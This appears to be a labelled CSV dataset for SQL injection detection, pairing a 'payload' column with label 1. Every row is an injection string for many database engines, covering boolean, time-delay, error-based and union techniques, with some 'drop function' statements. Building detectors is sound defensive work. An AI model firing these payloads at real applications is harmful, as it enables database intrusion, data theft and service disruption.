payload,label
1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,1
"1%""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
1' where 3337  =  3337 and 8403  =  5760,1
"1"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vurb"" like ""vurb",1
1  )   where 8094  =  8094,1
"1%'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc,1
"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",1
if  (  8574  =  7534  )   select 8574 else drop function nxbe--,1
1'  )   and 7533  =  7533,1
"1  )   union all select null,null,null,null--",1
1'||  (  select 'scct' where 2587  =  2587 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1
-6449'   )    )    or 2590  =  2848,1
1' where 3362  =  3362,1
-1252'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'pzxh' like 'pzxh,1
-8684' where 9820  =  9820 or 6844  =  5105,1
"1%'   )    )     )   union all select null,null,null,null--",1
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1
"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
select sleep  (  5   )    )   +',1
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
 (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1
"1%'  )   union all select null,null,null,null,null#",1
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",1
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,1
"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",1
1' where 6168  =  6168,1
"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",1
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1
"-6772""   )    )    or 9323  =  9323#",1
"1"" and   (  7597  =  8422  )  *8422 and ""gywp"" like ""gywp",1
1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",1
"-3769""   )    )     )   union all select 8456#",1
1'+  (  select 'vjoj' where 5348  =  5348,1
"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,1
-4828%'  )   or 8678  =  5745#,1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",1
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",1
"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",1
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",1
"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
"1""  )   and 7533  =  7533 and   (  ""yqzq""  =  ""yqzq",1
1   )    )    as vryv where 5600  =  5600,1
"-5013'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'ehwh' like 'ehwh",1
"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",1
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",1
"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",1
"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""   )    )    union all select null,null,null,null,null,null#",1
1 where 3502  =  3502 order by 1--,1
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1
1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"-3865'  )   union all select 4935,4935,4935,4935,4935--",1
"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1""",1
1'+  (  select zwsr where 6567  =  6567,1
1'  )   and 8404  =  8651#,1
"1%"" and 4595  =  4595#",1
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""kszu""  =  ""kszu",1
"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1
"select count  (  *  )   from generate_series  (  1,5000000   )    )   +'",1
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",1
1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    as gvpm where 5170  =  5170 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1
1'+  (  select 'mdiu' where 4443  =  4443,1
"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",1
1'+  (  select 'wvqj' where 3709  =  3709,1
1'+  (  select 'xpby' where 2724  =  2724,1
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,1
"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1
"1%'  )   union all select null,null--",1
"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",1
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo",1
"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",1
end and    (    (     (  'nhub'  =  'nhub,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",1
1'   )    )    as sjzf where 9997  =  9997 and 4193  =  5408,1
"-2032%""   )    )     )   or   (  3082  =  7155  )  *7155 and    (    (     (  ""%""  =  """,1
"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,1
"1'  )   as cgsz where 7194  =  7194 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"-4397'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'omqt'  =  'omqt",1
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,1
select pg_sleep  (  5  )   and   (  1044  =  1044,1
-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,1
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy",1
"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '%'  =  '",1
"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",1
"1'||  (  select 'cozi' from dual where 2607  =  2607 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'uzxr'  =  'uzxr",1
"-2434  )   union all select 8310,8310,8310,8310,8310--",1
"-2112 union all select 2995,2995,2995,2995,2995--",1
"1""   )    )    as oxrr where 6141  =  6141 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1 where 6221  =  6221 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-5365 or 7517  =  5726--,1
if  (  7427  =  7800  )   select 7427 else drop function dgir--,1
"iif  (  7953  =  3021,1,1/0  )  ",1
"1"" where 7005  =  7005",1
1 where 9620  =  9620 waitfor delay '0:0:5'--,1
-6405%'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  '%'  =  ',1
"1""  )   and 4760  =  2922",1
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",1
"1"" union all select null,null,null,null,null,null--",1
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1'  )   where 8125  =  8125 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1'  )   where 2775  =  2775 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1  )   as fnpq where 5209  =  5209,1
"1""   )    )     )   order by 1#",1
1 where 8889  =  8889,1
"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-9873"" union all select 8020,8020,8020,8020,8020,8020#",1
"1 where 8045  =  8045 union all select null,null,null--",1
1'||  (  select 'lzzr' where 2477  =  2477,1
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""zyoo""  =  ""zyoo",1
"1%""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""%""  =  """,1
-7369 or 9323  =  9323#,1
